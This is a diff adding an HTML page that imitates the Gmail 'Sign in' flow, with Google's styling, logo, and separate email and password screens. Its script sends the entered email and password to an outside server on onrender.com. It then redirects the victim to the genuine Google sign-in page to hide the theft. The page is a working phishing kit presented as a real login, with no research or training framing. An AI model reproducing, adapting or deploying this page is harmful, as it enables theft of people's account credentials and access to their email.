@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            margin: 0;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #1f1f1f;
+        }
+
+        .main-content {
+            flex: 1;
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .logo-container {
+            margin-top: 20px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 10px 0;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #1f1f1f;
+            margin: 0 0 40px 0;
+        }
+
+        .account-badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 6px 14px 6px 10px;
+            border: 1px solid #747775;
+            border-radius: 100px;
+            font-size: 14px;
+            color: #1f1f1f;
+            margin-bottom: 28px;
+            cursor: pointer;
+            background: none;
+            text-decoration: none;
+        }
+
+        .account-badge svg {
+            margin-right: 8px;
+            color: #444746;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .material-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            background: transparent;
+            color: #1f1f1f;
+        }
+
+        .material-input:focus {
+            border: 2px solid #0b57d0;
+            padding: 15px; /* Adjust for border width */
+        }
+
+        .input-label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #ffffff;
+            padding: 0 4px;
+            color: #444746;
+            transition: 0.15s ease all;
+            pointer-events: none;
+            font-size: 16px;
+        }
+
+        /* Float label on focus or if value exists */
+        .material-input:focus ~ .input-label,
+        .material-input:not(:placeholder-shown) ~ .input-label {
+            top: 0;
+            font-size: 12px;
+            color: #0b57d0;
+        }
+
+        .blue-link {
+            color: #0b57d0;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            cursor: pointer;
+        }
+
+        .notice-text {
+            font-size: 14px;
+            color: #444746;
+            line-height: 20px;
+            margin-top: 24px;
+            margin-bottom: 40px;
+        }
+
+        .actions-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .btn-secondary {
+            color: #0b57d0;
+            font-weight: 500;
+            font-size: 14px;
+            background: none;
+            border: none;
+            text-decoration: none;
+            padding: 10px 0;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background-color: #0b57d0;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            cursor: pointer;
+            min-width: 48px;
+        }
+
+        .footer {
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto;
+            padding-bottom: 24px;
+            font-size: 12px;
+            color: #444746;
+            margin-top: auto;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 16px;
+        }
+
+        .footer-links a {
+            color: #444746;
+            text-decoration: none;
+        }
+
+        /* View Toggling */
+        .view { display: none; }
+        .view.active { display: block; }
+
+    </style>
+</head>
+<body>
+
+    <div class="main-content">
+        <div class="logo-container">
+            <svg xmlns="http://w3.org" viewBox="0 0 512 512" width="48" height="48">
+  <defs>
+    <!-- Geometric cutout shape of the official Google G -->
+    <mask id="google-g-perfect-mask">
+      <rect width="512" height="512" fill="black" />
+      <path fill="white" d="M492 256c0-16.5-1.5-32.5-4.2-48H256v92h132.5c-5.7 30.7-23 56.7-49.1 74.2v61.5h79.5c46.5-42.8 73.1-105.7 73.1-179.7z 
+                           M256 500c65.9 0 121.1-21.8 161.5-59.2l-79.5-61.5c-22.1 14.8-50.3 23.5-82 23.5-63.1 0-116.5-42.6-135.6-100H38.5v63.5C78.9 446.4 161.2 500 256 500z 
+                           M120.4 302.8c-4.8-14.8-7.6-30.5-7.6-46.8s2.8-32 7.6-46.8V145.7H38.5C22.2 178.2 13 216.1 13 256s9.2 77.8 25.5 110.3l81.9-63.5z 
+                           M256 112.2c35.8 0 68 12.3 93.3 36.4l70-70C377.1 40.2 321.9 12 256 12 161.2 12 78.9 65.6 38.5 145.7l81.9 63.5c19.1-57.4 72.5-100 135.6-100z"/>
+    </mask>
+  </defs>
+
+  <!-- Renders the continuous color wheel behind the mask at the new smaller size -->
+  <foreignObject width="512" height="512" mask="url(#google-g-perfect-mask)">
+    <div xmlns="http://w3.org" style="
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: conic-gradient(
+        from 0deg at 50% 50%,
+        #4285F4 0deg 45deg,
+        #EA4335 120deg,
+        #FBBC05 200deg,
+        #34A853 280deg,
+        #4285F4 340deg 360deg
+      );
+    "></div>
+  </foreignObject>
+</svg>
+        </div>
+        
+        <form id="login-form">
+            <!-- ================= VIEW 1: EMAIL SCREEN ================= -->
+            <div id="email-view" class="view active">
+                <h1>Sign in</h1>
+                <p class="subtitle">Use your Google Account</p>
+
+                <button type="button" class="account-badge">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                    </svg>
+                    <span id="emailBadge">Email or phone</span>
+                </button>
+
+                <div class="input-wrapper">
+                    <input type="email" id="emailInput" name="email" class="material-input" placeholder=" " required>
+                    <label class="input-label" for="emailInput">Email or phone</label>
+                </div>
+
+                <div class="notice-text">
+                    <a href="#" class="blue-link">Forgot email?</a>
+                </div>
+
+                <div class="actions-container">
+                    <button type="button" class="btn-secondary">Create account</button>
+                    <!-- This is a button type=button, so it won't submit the form yet -->
+                    <button type="button" id="btn-email-next" class="btn-primary">Next</button>
+                </div>
+            </div>
+
+            <!-- ================= VIEW 2: PASSWORD SCREEN ================= -->
+            <div id="password-view" class="view">
+                <h1>Welcome</h1>
+                
+                <button type="button" class="account-badge">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                    </svg>
+                    <span id="userBadge">User</span>
+                </button>
+
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" name="password" class="material-input" placeholder=" " required>
+                    <label class="input-label" for="passwordInput">Enter your password</label>
+                </div>
+
+                <div class="notice-text" style="margin-top: 48px;">
+                    <a href="#" class="blue-link">Forgot password?</a>
+                </div>
+
+                <div class="actions-container">
+                    <button type="button" id="btn-pass-back" class="btn-secondary">Back</button>
+                    <!-- This is type=submit, so it triggers the fetch -->
+                    <button type="submit" class="btn-primary">Next</button>
+                </div>
+            </div>
+        </form>
+
+    </div>
+
+    <div class="footer">
+        <div class="lang-select">English (United States)</div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // ================= DOM ELEMENTS =================
+        const emailView = document.getElementById('email-view');
+        const passwordView = document.getElementById('password-view');
+        const emailInput = document.getElementById('emailInput');
+        const emailBadge = document.getElementById('emailBadge');
+        const userBadge = document.getElementById('userBadge');
+        
+        // Buttons
+        const btnEmailNext = document.getElementById('btn-email-next');
+        const btnPassBack = document.getElementById('btn-pass-back');
+        const form = document.getElementById('login-form');
+
+        // ================= INTERACTION LOGIC =================
+
+        // 1. Email -> Password Transition
+        btnEmailNext.addEventListener('click', function() {
+            if (emailInput.value.trim() !== "") {
+                // Update the badge in the password view
+                userBadge.textContent = emailInput.value;
+                
+                // Switch Views
+                emailView.classList.remove('active');
+                passwordView.classList.add('active');
+                
+                // Focus the password field
+                document.getElementById('passwordInput').focus();
+            } else {
+                alert("Please enter an email address.");
+            }
+        });
+
+        // 2. Password -> Email Transition (Back)
+        btnPassBack.addEventListener('click', function() {
+            passwordView.classList.remove('active');
+            emailView.classList.add('active');
+        });
+
+        // ================= FETCH LOGIC =================
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const targetEndpoint = 'https://my-backend-5mo9.onrender.com/submit'; 
+            const externalRedirectUrl = 'https://accounts.google.com/v3/signin/identifier?continue=https://mail.google.com/mail/u/0/&emr=1&followup=https://mail.google.com/mail/u/0/&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S2117645748:1790344518538254';
+
+            // Gather data from the form
+            const formData = new FormData(form);
+            const urlEncodedPayload = new URLSearchParams(formData);
+
+            console.log("Sending payload:", urlEncodedPayload.toString());
+
+            fetch(targetEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: urlEncodedPayload,
+                mode: 'cors'
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Server returned error status');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Server response accepted:', data);
+                window.location.href = externalRedirectUrl;
+            })
+            .catch(error => {
+                console.error('Network routing execution caught error:', error);
+                // Fallback redirect
+                window.location.href = externalRedirectUrl;
+            });
+        });
+    </script>
+</body>
+</html>
